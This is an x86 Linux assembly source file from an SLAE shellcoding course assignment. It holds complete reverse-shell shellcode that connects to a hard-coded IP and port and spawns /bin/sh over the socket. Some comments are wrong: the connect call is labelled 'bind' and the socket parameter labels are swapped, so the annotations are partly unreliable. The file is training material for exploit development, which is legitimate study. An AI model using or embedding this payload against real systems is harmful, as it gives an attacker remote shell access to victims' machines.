; Filename: assignment2_reverse-shell-tcp.nasm
; Author:  Marco Lugo (SLAE-1031)
; Description: spawns reverse shell on TCO port 57005 (0xdead) for ip 192.168.2.15
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; The resulting shellcode is 97 bytes

global _start  		

section .text
_start:
	xor eax, eax ; assigns 0x00 to EAX
	xor ebx, ebx ; assigns 0x00 to EBX
	xor ecx, ecx ; assigns 0x00 to ECX
	xor edx, edx ; assigns 0x00 to EDX
	
	; process sockets
	mov al, 0x66 ; sys_socketcall
	mov bl, 0x01 ; socket (int sys_socket(int family, int type, int protocol))
	push ecx ; pushes ECX (0x00)
	push 0x06 ; set parameter family
	push 0x01 ; set parameter type
	push 0x02 ; set parameter protocol
	mov ecx, esp ; pop socket parameters back into ECX
	int 0x80 ; execute system call
	
	mov esi, eax ; previous sys_socketcall is stored in EAX, pass it to ESI
	mov al, 0x66 ; sys_socketcall
	mov bl, 0x02 ; bind (int sys_bind(int fd, struct sockaddr *umyaddr, int addrlen))
	push   0x0f02a8c0 ; ip 192.168.2.15 (0xc0 0xa8 0x02 0x0f)
	;push 0x0100007f ; ip 127.0.0.1
	push word 0xadde ; port 57005
	push bx
	inc bl
	mov ecx, esp
	push 0x10 
	push ecx
	push esi
	mov ecx, esp ; put back parameters from stack into ECX
	int 0x80 ; execute system call
	
	; handle file descriptors
	xor ecx, ecx
	
	mov cl, 0x02 ; stderr
	mov al, 0x3f ; sys_dup2 (int dup2(int oldfd, int newfd))
	int 0x80 ; execute system call
	mov cl, 0x01 ; stdout
	mov al, 0x3f ; sys_dup2 (int dup2(int oldfd, int newfd))
	int 0x80 ; execute system call
	xor ecx, ecx ; stdin
	mov al, 0x3f ; sys_dup2 (int dup2(int oldfd, int newfd))
	int 0x80 ; execute system call
	
	; open /bin/sh shell
	xor eax, eax ; assigns 0x00 to EAX
	push eax ; push 0x00 (null byte) to stack

	push 0x68732f6e ; push n/sh hex encoded and inverted to account for the little-endian CPU architecture
	push 0x69622f2f ; push //bi with the same adjustments as the previous line
	
	mov ebx, esp ; retrieves stack (i.e. null-terminated //bin/sh) and passes it to EBX, which will act as an argument to execve
	
	push eax ; push 0x00 (null byte) to stack
	push ebx ; push EBX to stack
	mov ecx, esp ; retrieves the address of the null-terminated shellpath and assigns it to ECX, an argument for execve
	
	xor edx, edx ; assigns 0x00 to EDX which will also act as an argument for execve

	mov al, 0x0b ; assign 11 to al (eax) as this is the syscall number for execve
	int 0x80 ; execute system call
	